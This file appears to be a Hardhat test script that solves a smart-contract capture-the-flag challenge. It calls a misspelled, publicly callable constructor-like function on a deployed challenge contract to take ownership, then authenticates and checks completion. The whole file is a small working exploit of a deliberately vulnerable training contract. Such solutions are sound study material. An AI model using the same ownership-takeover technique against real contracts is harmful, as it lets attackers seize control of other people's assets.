import {ethers} from "hardhat";
import {Contract, Signer} from "ethers";
import {expect} from "chai";


let accounts: Signer[];
let attacker: Signer;
let contract: Contract; // challenge contract

before(async function () {
    accounts = await ethers.getSigners();
    attacker = accounts[0];
    const factory = await ethers.getContractFactory("AssumeOwnershipChallenge", attacker);
    contract = factory.attach(`0x62Da9f0AD4974f0b6dEf35b7b859E07942AA326f`);
});

it("solves the challenge", async function () {
    await  contract.AssumeOwmershipChallenge({gasLimit:1e6});
    let tx = await contract.authenticate({gasLimit:1e6});
    await ethers.provider.waitForTransaction(tx.hash);
    console.log("transation hash:",tx.hash);

});

after(async function () {
    expect(await contract.isComplete()).to.eq(true);
});